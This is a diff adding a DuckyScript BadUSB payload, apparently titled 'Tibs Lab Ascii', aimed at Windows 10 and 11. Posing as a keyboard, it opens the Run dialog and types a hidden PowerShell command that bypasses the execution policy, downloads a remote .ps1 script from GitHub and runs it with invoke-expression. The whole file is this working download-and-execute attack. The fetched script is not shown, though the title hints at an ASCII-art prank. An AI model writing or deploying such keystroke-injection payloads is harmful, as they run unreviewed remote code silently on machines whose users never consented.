@@ -1,0 +1,8 @@
+REM     Title: Tibs Lab Ascii
+REM     Author: Thibault Jochem
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Tryum/badusb-ascii/refs/heads/main/tibslab.ps1?dl=1; invoke-expression $pl
+ENTER
